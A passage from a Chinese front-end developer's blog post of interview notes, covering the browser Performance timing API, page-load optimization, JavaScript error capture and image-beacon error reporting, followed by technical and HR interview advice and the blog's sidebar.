<td style="text-align:left">HTTPS 连接开始的时间，如果不是安全连接，则值为 0</td>
</tr>
<tr>
<td style="text-align:left">requestStart</td>
<td style="text-align:left">HTTP 请求读取真实文档开始的时间（完成建立连接），包括从本地读取缓存,连接错误重连时，这里显示的也是新建立连接的时间</td>
</tr>
<tr>
<td style="text-align:left">responseStart</td>
<td style="text-align:left">HTTP 开始接收响应的时间（获取到第一个字节），包括从本地读取缓存</td>
</tr>
<tr>
<td style="text-align:left">responseEnd</td>
<td style="text-align:left">HTTP 响应全部接收完成的时间（获取到最后一个字节），包括从本地读取缓存</td>
</tr>
<tr>
<td style="text-align:left">domLoading</td>
<td style="text-align:left">开始解析渲染 DOM 树的时间，此时 Document.readyState 变为 loading，并将抛出 readystatechange 相关事件</td>
</tr>
<tr>
<td style="text-align:left">domInteractive</td>
<td style="text-align:left">完成解析 DOM 树的时间，Document.readyState 变为 interactive，并将抛出 readystatechange 相关事件，<br><strong>注意</strong>：只是 DOM 树解析完成，这时候并没有开始加载网页内的资源</td>
</tr>
<tr>
<td style="text-align:left">domContentLoadedEventStart</td>
<td style="text-align:left">DOM 解析完成后，网页内资源加载开始的时间,文档发生 DOMContentLoaded事件的时间</td>
</tr>
<tr>
<td style="text-align:left">domContentLoadedEventEnd</td>
<td style="text-align:left">DOM 解析完成后，网页内资源加载完成的时间（如 JS 脚本加载执行完毕），文档的DOMContentLoaded 事件的结束时间</td>
</tr>
<tr>
<td style="text-align:left">domComplete</td>
<td style="text-align:left">DOM 树解析完成，且资源也准备就绪的时间，Document.readyState 变为 complete，并将抛出 readystatechange 相关事件</td>
</tr>
<tr>
<td style="text-align:left">loadEventStart</td>
<td style="text-align:left">load 事件发送给文档，也即 load 回调函数开始执行的时间,如果没有绑定 load 事件，值为 0</td>
</tr>
<tr>
<td style="text-align:left">loadEventEnd</td>
<td style="text-align:left">load 事件的回调函数执行完毕的时间,如果没有绑定 load 事件，值为 0</td>
</tr>
</tbody>
</table>
<p><strong>常用计算：</strong><br>DNS查询耗时 ：domainLookupEnd - domainLookupStart<br>TCP链接耗时 ：connectEnd - connectStart<br>request请求耗时 ：responseEnd - responseStart<br>解析dom树耗时 ： domComplete - domInteractive<br>白屏时间 ：responseStart - navigationStart<br>domready时间(用户可操作时间节点) ：domContentLoadedEventEnd - navigationStart<br>onload时间(总下载时间) ：loadEventEnd - navigationStart</p>
<h4 id="getEntries-方法-所有资源的信息"><a href="#getEntries-方法-所有资源的信息" class="headerlink" title="getEntries()方法 所有资源的信息"></a>getEntries()方法 所有资源的信息</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.performance.getEntries().forEach(<span class="function"><span class="params">item</span> =&gt;</span> <span class="built_in">console</span>.log(item))</span><br></pre></td></tr></table></figure>
<p><img src="../images/javascript/js_performace_getEntries1.png" title="performance.getEntries()" width="100%"></p>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">name</td>
<td style="text-align:left">资源名称，是资源的绝对路径或调用mark方法自定义的名称</td>
</tr>
<tr>
<td style="text-align:left">startTime</td>
<td style="text-align:left">开始时间</td>
</tr>
<tr>
<td style="text-align:left">duration</td>
<td style="text-align:left">加载时间</td>
</tr>
<tr>
<td style="text-align:left">entryType</td>
<td style="text-align:left">资源类型</td>
</tr>
<tr>
<td style="text-align:left">initiatorType</td>
<td style="text-align:left">谁发起的请求</td>
</tr>
</tbody>
</table>
<p>全局监控：如果我们想打印当前页面所有资源的信息，可导入下面的脚本。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 浏览器不支持，就算了！</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">window</span>.performance &amp;&amp; !<span class="built_in">window</span>.performance.getEntries) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line">    <span class="comment">// 获取当前页面所有请求对应的PerformanceResourceTiming对象进行分析</span></span><br><span class="line">    <span class="built_in">window</span>.performance.getEntries().forEach(<span class="function"><span class="keyword">function</span> (<span class="params">perf</span>) </span>&#123;</span><br><span class="line">        result.push(&#123;</span><br><span class="line">            <span class="string">'url'</span>: perf.name,</span><br><span class="line">            <span class="string">'entryType'</span>: perf.entryType,</span><br><span class="line">            <span class="string">'type'</span>: perf.initiatorType,</span><br><span class="line">            <span class="string">'duration(ms)'</span>: perf.duration</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 控制台输出统计结果</span></span><br><span class="line">    <span class="built_in">console</span>.table(result);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p><img src="../images/javascript/js_performace_getEntries2.png" title="performance.getEntries2" width="100%"></p>
<h3 id="页面性能优化"><a href="#页面性能优化" class="headerlink" title="页面性能优化"></a>页面性能优化</h3><blockquote>
<p>参考：<a href="https://segmentfault.com/a/1190000016458627#articleHeader17" target="_blank" rel="noopener">segmentfault 浏览器渲染过程</a></p>
</blockquote>
<h4 id="网络请求的优化"><a href="#网络请求的优化" class="headerlink" title="网络请求的优化"></a>网络请求的优化</h4><ol>
<li><p>静态资源<br>1). 拼接、合并、压缩、制作雪碧图<br>使用webpack或者gulp等打包工具对资源（js、css、图片等）进行打包、合并、去重、压缩。对于图片资源，我们可以制作雪碧图。</p>
<p>2). CDN资源分发<br>将一些静态资源文件托管在第三方CDN服务中，一方面可以减少服务器的压力，另一方面，CDN的优势在于，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上，保证资源的加载速度和稳定性。</p>
<p>3). 缓存<br>缓存的范围很广，比如协议层的DNS解析缓存、代理服务器缓存，到客户端的浏览器本地缓存，再到服务端的缓存。一个网络链路的每个环节都有被缓存的空间。缓存的目的是简化资源的请求路径，比如某些静态资源在客户端已经缓存了，再次请求这个资源，只需要使用本地的缓存，而无需走网络请求去服务端获取。</p>
<p>4). 分片<br>分片指得是将资源分布到不同的主机，这是为了突破浏览器对同一台主机建立tcp连接的数量限制，一般为6~8个。现代网站的资源数量有50~100个很常见，所以将资源分布到不同的主机上，可以建立更多的tcp请求，降低请求耗时，从而提升网页速度。</p>
</li>
</ol>
<ol start="2">
<li><p>业务数据<br>1.）首屏直出<br>为了提升用户体验，我们认为首屏的渲染速度是极为重要的，用户进来页面，首页可见区域的加载可以由服务端渲染，保证了首屏加载速度，而不可见的部分则可以异步加载，甚至做到子路由页面的预加载。</p>
<p>2.）接口合并<br>前端经常有这样的场景，完成一个功能需要先请求第一个接口获得数据，然后再根据数据请求第二个接口获取第二个数据，然后第三、第四…前端通常需要通过promise或者回调，一层一层的then下去，这样显然是很消耗性能的。<br>应该有服务端处理中间的流程，前端只发一次请求。</p>
</li>
</ol>
<h4 id="页面渲染性能的优化"><a href="#页面渲染性能的优化" class="headerlink" title="页面渲染性能的优化"></a>页面渲染性能的优化</h4><ol>
<li><p>防止阻塞渲染<br>页面中的css 和 js 会阻塞html的解析，因为他们会影响dom树和render树。为了避免阻塞，我们可以做这些优化：</p>
<p>1.) css 放在首部，提前加载，这样做的原因是： 通常情况下 CSS 被认为是阻塞渲染的资源，在CSSOM 构建完成之前，页面不会被渲染，放在顶部让样式表能够尽早开始加载。但如果把引入样式表的 link 放在文档底部，页面虽然能立刻呈现出来，但是页面加载出来的时候会是没有样式的，是混乱的。当后来样式表加载进来后，页面会立即进行重绘，这也就是通常所说的闪烁了。</p>
<p>2.) js文件放在底部，防止阻塞解析</p>
<p>3.) 一些不改变dom和css的js 使用 <code>defer</code> 和 <code>async</code> 属性告诉浏览器可以异步加载，不阻塞解析</p>
</li>
<li><p>减少重排和重绘<br>重绘和回流在实际开发中是很难避免的，我们能做的就是尽量减少这种行为的发生。</p>
<p>1.) js尽量少访问dom节点和css属性</p>
<p>2.) 尽可能的为产生动画的 <code>HTML</code> 元素使用 <code>fixed</code> 或 <code>absolute</code> 的 <code>position</code> ，那么修改他们的 <code>CSS</code> 是不会 <code>Reflow</code> 的。</p>
<p>3.) img标签要设置高宽，以减少重绘重排</p>
<p>4.) 把DOM离线后修改，如将一个dom脱离文档流，比如 <code>display: none</code> ，再修改属性，这里只发生一次回流。</p>
<p>5.) 尽量用 <code>transform</code> 来做形变和位移，不会造成回流</p>
</li>
<li><p>提高代码质量</p>
<ul>
<li><p>html<br>1.) dom层级不要太深，否则会增加dom树构建的时间，js访问深层的dom也会造成更大的负担。</p>
<p>2.) meta标签里需要定义文档的编码，便于浏览器解析</p>
</li>
<li><p>css<br>1.) 减少 CSS 嵌套层级和选择适当的选择器</p>
<p>2.) 对于首屏的关键css 可以使用style标签内联</p>
</li>
<li><p>js<br>1.) 减少通过 <code>JavaScript</code> 代码修改元素样式，尽量使用修改class名方式操作样式或动画。</p>
<p>2.) 访问dom节点时需要对dom节点转存，防止循环中重复访问dom节点造成性能损耗。</p>
<p>3.) 慎用 定时器 和 计时器， 使用完后需要销毁。</p>
<p>4.) 用于复杂计算的js代码可以放在worker进程中运行</p>
<p>5.) 对于一些高频的回调需要对其节流和消抖，就是 <code>throttle</code> 和 <code>debounce</code> 这两个函数。比如 <code>scroll</code> 和 <code>touch</code> 事件。</p>
</li>
</ul>
</li>
</ol>
<h4 id="面试回答"><a href="#面试回答" class="headerlink" title="面试回答"></a>面试回答</h4><ol>
<li><p>资源压缩、合并，减少HTTP请求</p>
</li>
<li><p>非核心代码异步加载<br>1.) 动态脚本加载，使用js动态创建 <code>script</code> 然后插入到 <code>head</code> 中<br>2.) defer，在 <code>HTML</code> 解析完之后才会执行，如果是多个，则按照顺序执行<br>3.) async，加载完之后立即执行，如果是多个，执行顺序和加载顺序无关</p>
</li>
</ol>
<p>  结果：<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line"><span class="comment">// async1</span></span><br><span class="line"><span class="comment">// async2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可能是（当实际文件内容差别大时）：</span></span><br><span class="line"><span class="comment">// main</span></span><br><span class="line"><span class="comment">// async2</span></span><br><span class="line"><span class="comment">// async1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 先执行完后面的script标签，再不定顺序的执行async的script，async1 和 async2 的顺序不定</span></span><br></pre></td></tr></table></figure></p>
<ol start="3">
<li><p>利用浏览器缓存(http协议头)<br>1.) 强缓存(服务器同时下发这两个是，以Cache-Control为准)<br><strong>Expires</strong> &nbsp;&nbsp;&nbsp;&nbsp;  Expires:Mon,18 Oct 2066 23:59:59 GMT</p>
<p><strong>Cache-Control</strong> &nbsp;&nbsp;&nbsp;&nbsp; Cache-Control:max-age=3600</p>
<p>2.) 协商缓存<br><strong>Last-Modify</strong> &nbsp;&nbsp;&nbsp;&nbsp; <strong>If-Modify-Since</strong> &nbsp;&nbsp;&nbsp;&nbsp; Last-Modify: Thu,31 Dec 2037 23:59:59 GMT<br><strong>ETag</strong> &nbsp;&nbsp;&nbsp;&nbsp; <strong>If-None-Match</strong> &nbsp;&nbsp;&nbsp;&nbsp;</p>
</li>
<li><p>使用CDN（img、css、js）</p>
</li>
<li><p>预解析DNS</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"x-dns-prefetch-control"</span> <span class="attr">content</span>=<span class="string">"on"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>代码优化</p>
</li>
</ol>
<h3 id="错误监控"><a href="#错误监控" class="headerlink" title="错误监控"></a>错误监控</h3><ol>
<li><p>前端错误的分类<br>1.) 即时运行错误（代码错误）<br>2.) 资源加载错误（css、js加载错误）</p>
</li>
<li><p>错误捕获方式<br>1.）即时运行错误</p>
<ul>
<li><code>try...catch</code></li>
<li><code>window.onerror / window.addEventListener(&#39;error&#39;, function () {})`</code></li>
</ul>
<p>2.) 资源加载错误（冒泡无法获知，捕获可以获知）</p>
<ul>
<li><code>Obejct.onerror</code></li>
<li><p><code>performance.getEntries()</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">performance.getEntries().forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会输入所有的资源信息</span></span><br><span class="line"><span class="comment">// 判断总资源数是否相等（间接法）</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Error事件捕获</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(<span class="string">'捕获到异常'</span>, e);</span></span><br><span class="line"><span class="javascript">&#125;, <span class="literal">true</span>); <span class="comment">// false表示冒泡，true表示捕获，资源加载异常只能通过捕获获知</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//baidu.com/test.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>3.) 提问：跨域的js可以捕获到错误码？错误提示是什么？应该怎么处理？</p>
<ul>
<li><p>错误提示<br><img src="../images/javascript/js_error_control.png" title="跨域的js错误提示" width="60%"><br>从结果可以看出：无法获取具体的出错文件和代码行数</p>
</li>
<li><p>处理办法<br>客户端：<code>script</code> 标签增加 <code>crossorigin</code> 属性<br>服务端：设置js资源响应头 <code>Access-Control-Allow-Origin:*</code></p>
</li>
</ul>
</li>
</ol>
<ol start="3">
<li>上报错误的基本原理<br>1.) <code>ajax</code> 请求上报（可以做到，但是通常不会使用此方法）<br>2.) <code>image</code> 对象上报，打点…<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">'http://baidu.com/test?error=qwer'</span>; <span class="comment">// network中就可以看到这个请求了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一些大公司的打点也是这个原理</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<h2 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h2><h3 id="技术面试"><a href="#技术面试" class="headerlink" title="技术面试"></a>技术面试</h3><ol>
<li><p>业务能力</p>
<ul>
<li>做过什么业务<br>校长教研员后台系统、教学助手、德育管理、小程序</li>
<li>负责的业务有什么业绩</li>
<li>使用了什么技术方案<br>ECharts、Vue、html2canvas、小程序</li>
<li>突破了什么技术难点</li>
<li>遇到了什么问题<br>合成pdf太大的问题（拆分多次上传）、ECharts数据太多（拆分成多个图表）、H5置顶问题/iOS输入框+列表滑动问题（修改布局）</li>
<li>最大的收获是什么<br>对业务理解的更深入，对使用的技术更加熟练，更有把控</li>
</ul>
</li>
<li><p>团队协作能力</p>
</li>
<li><p>事物推动能力（跨部门、跨组）</p>
</li>
<li><p>带人能力<br>code reivew<br>编写框架，通用方法的编写<br>制定规范，eslint、变量、方法命名等<br>对开发时间有整体把握，及时调整</p>
</li>
<li><p>其他能力</p>
</li>
<li><p>你还有什么要问的吗？<br>对技术框架是否限制<br>开发环境一共几种（本地、test、staging、线上）<br>APP 页面开发时是否有一套成熟的客户端与js交互方法<br>是否有公司自己的打点体系<br>是否有deployer构建机制<br>是否经常会有一些大牛技术分享会<br>是否有相应的运维部门提供运维服务</p>
</li>
</ol>
<h3 id="HR面试"><a href="#HR面试" class="headerlink" title="HR面试"></a>HR面试</h3><ol>
<li><p>面试技巧</p>
<ul>
<li>乐观积极</li>
<li>主动沟通</li>
<li>逻辑顺畅</li>
<li>上进有责任心</li>
<li>有主张、做事果断</li>
</ul>
</li>
<li><p>内容分布（HR提问）</p>
<ul>
<li><p>职业竞争力（为什么这个职位你会合适）<br>1.) 业务能力（行业第一）</p>
<p>2.) 思考能力（对同一件事可以从不同的角度去思考问题，找到最优的解决方案）<br> 遇到难题怎么办：先自身花时间上网查找解决方法，尽可能的自己去解决。实在无法解决的话，询问一下技术群大牛，寻求一些同行朋友的帮助。解决之后进行总结，为什么自己无法解决，而别人可以，别人解决问题的思路是什么，用了哪些技术方案等</p>
<p>3.) 学习能力（不断的学习新的业务和技术，沉淀、总结）<br> 周末喜欢做什么：有空的时候会去参加一些分享会，多学习一些新的知识技能，了解一些行业的技术方案</p>
<p>4.) 无上限的付出（对于无法解决的问题可以熬夜、加班）</p>
</li>
<li><p>职业规划（对未来的规划）<br>1.) 目标是什么<br> 在业务上成为专家，帮助公司在行业上成为第一，在技术上成为行业大牛</p>
<p>2.) 近阶段的目标<br> 不断的学习和积累各方面的经验，以学习为主<br> 如果公司给我分配一个新岗位，我要先清楚岗位做什么，难点是什么，突破点在哪里，我要把它做到极值</p>
<p>3.) 长期目标<br> 做几件很有价值的事，如开源作品、技术框架（这两点很重要）</p>
<p>4.) 方式方法<br> 先完成业务上的主要问题，做到极致，然后逐步向目标靠拢<br> 我希望公司技术部会定期有分享会，公司能给我一些工具、一些平台、一些权限让我能够最大高效的解决问题</p>
</li>
</ul>
</li>
<li><p>沟通技巧<br>多夸人，多赞美HR</p>
</li>
</ol>
<h3 id="面试技巧"><a href="#面试技巧" class="headerlink" title="面试技巧"></a>面试技巧</h3><ol>
<li>JD描述（职位描述）<br>校招一定要看</li>
<li>简历<br>对照JD改出相吻合的简历，对于未掌握的技术栈快速复习、理解</li>
<li>自我介绍<br>一定要打草稿，展示什么优势，描述什么项目，切忌临场发挥</li>
</ol>
<h3 id="面试流程"><a href="#面试流程" class="headerlink" title="面试流程"></a>面试流程</h3><ol>
<li>一面<br>重基础<br>懂原理<br>要思考（不会的话不能直接回答不会，一定要深入思考）<br>知进退（不懂的话，可以问面试官能不能给个指导方向、查询的资料等）<br>势不可挡</li>
<li>二面<br>横向扩展<br>项目结合</li>
<li>三面<br>有经验<br>懂合作<br>有担当<br>动规矩<br>察言观色</li>
<li>终面<br>会沟通<br>要上进<br>好性格<br>有主见<br>强逻辑<br>无可挑剔</li>
<li>复盘<br>胜不骄，败不馁<br>总结经验<br>步步为营<br>多拿几个offer</li>
</ol>
</image>
      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        
  <ul class="post-copyright">
    <li class="post-copyright-author">
      <strong>本文作者：</strong>
      Pimi Chen
    </li>
    <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="http://pimichen.com/blog/other/前端常见的面试题.html" title="前端常见的面试题">http://pimichen.com/blog/other/前端常见的面试题.html</a>
    </li>
    <li class="post-copyright-license">
      <strong>版权声明： </strong>
      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
    </li>
  </ul>


      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/blog/tags/other/" rel="tag"># Other</a>
          
        </div>
      

      
        
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/blog/javascript/前端算法集合.html" rel="next" title="前端算法集合">
                <i class="fa fa-chevron-left"></i> 前端算法集合
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/blog/vue/vue利用transition实现路由切换仿APP效果.html" rel="prev" title="vue利用transition实现路由切换仿APP效果">
                vue利用transition实现路由切换仿APP效果 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
        <!-- Go to www.addthis.com/dashboard to customize your tools -->
<div class="addthis_inline_share_toolbox">
  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=" async = "async" ></script>
</div>

      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div id="lv-container" data-id="city" data-uid="MTAyMC8yOTM2OC81OTM2"></div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/blog/images/mine/avatar.jpg"
               alt="Pimi Chen" />
          <p class="site-author-name" itemprop="name">Pimi Chen</p>
           
              <p class="site-description motion-element" itemprop="description">天道酬勤，上善若水</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/blog/archives">
                <span class="site-state-item-count">195</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/blog/tags/index.html">
                <span class="site-state-item-count">17</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/blog/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/cpm828" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://segmentfault.com/u/pimi" target="_blank" title="Segmentfault">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Segmentfault
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://weibo.com/pimi0828" target="_blank" title="微博">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                  微博
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://www.zhihu.com/people/Pimi.Chen" target="_blank" title="知乎">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  知乎
                </a>
              </span>
            
          
        </div>

        
        

        
        
          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
            <div class="links-of-blogroll-title">
              <i class="fa  fa-fw fa-globe"></i>
              Links
            </div>
            <ul class="links-of-blogroll-list">
              
                <li class="links-of-blogroll-item">
                  <a href="http://www.ruanyifeng.com/blog/" title="阮一峰" target="_blank">阮一峰</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="http://www.zhangxinxu.com/" title="张鑫旭" target="_blank">张鑫旭</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://github.com/cpm828/cpm-ui" title="cpm-ui" target="_blank">cpm-ui</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://github.com/cpm828/blog" title="pimi blog" target="_blank">pimi blog</a>
                </li>
              
            </ul>
          </div>
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#常见的前端算法题"><span class="nav-number">1.</span> <span class="nav-text">常见的前端算法题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Event-Loop"><span class="nav-number">2.</span> <span class="nav-text">Event Loop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#算法的时间与空间复杂度"><span class="nav-number">3.</span> <span class="nav-text">算法的时间与空间复杂度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SetTimeout的时间什么不准"><span class="nav-number">4.</span> <span class="nav-text">SetTimeout的时间什么不准</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#函数防抖和函数节流"><span class="nav-number">5.</span> <span class="nav-text">函数防抖和函数节流</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#函数防抖-debounce"><span class="nav-number">5.1.</span> <span class="nav-text">函数防抖 debounce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#函数节流-throttle"><span class="nav-number">5.2.</span> <span class="nav-text">函数节流 throttle</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IE盒模型和标准盒模型"><span class="nav-number">6.</span> <span class="nav-text">IE盒模型和标准盒模型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IE盒模型"><span class="nav-number">6.1.</span> <span class="nav-text">IE盒模型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#标准-W3C-盒模型"><span class="nav-number">6.2.</span> <span class="nav-text">标准(W3C)盒模型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#css-实现响应式的九宫格布局"><span class="nav-number">7.</span> <span class="nav-text">css 实现响应式的九宫格布局</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BFC"><span class="nav-number">8.</span> <span class="nav-text">BFC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BFC概念"><span class="nav-number">8.1.</span> <span class="nav-text">BFC概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何创建BFC"><span class="nav-number">8.2.</span> <span class="nav-text">如何创建BFC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BFC布局特性"><span class="nav-number">8.3.</span> <span class="nav-text">BFC布局特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BFC的作用"><span class="nav-number">8.4.</span> <span class="nav-text">BFC的作用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux-查找文件的命令"><span class="nav-number">9.</span> <span class="nav-text">linux 查找文件的命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#find"><span class="nav-number">9.1.</span> <span class="nav-text">find</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#grep"><span class="nav-number">9.2.</span> <span class="nav-text">grep</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#css伪类和伪元素的区别"><span class="nav-number">10.</span> <span class="nav-text">css伪类和伪元素的区别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#伪类"><span class="nav-number">10.1.</span> <span class="nav-text">伪类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#伪元素"><span class="nav-number">10.2.</span> <span class="nav-text">伪元素</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注意事项"><span class="nav-number">10.3.</span> <span class="nav-text">注意事项</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#伪元素的用途"><span class="nav-number">10.4.</span> <span class="nav-text">伪元素的用途</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#script-defer-和-async"><span class="nav-number">11.</span> <span class="nav-text">script defer 和 async</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#无defer和async"><span class="nav-number">11.1.</span> <span class="nav-text">无defer和async</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#有defer"><span class="nav-number">11.2.</span> <span class="nav-text">有defer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#有async"><span class="nav-number">11.3.</span> <span class="nav-text">有async</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图例"><span class="nav-number">11.4.</span> <span class="nav-text">图例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#静态（词法）作用域语言-和-动态作用域语言"><span class="nav-number">12.</span> <span 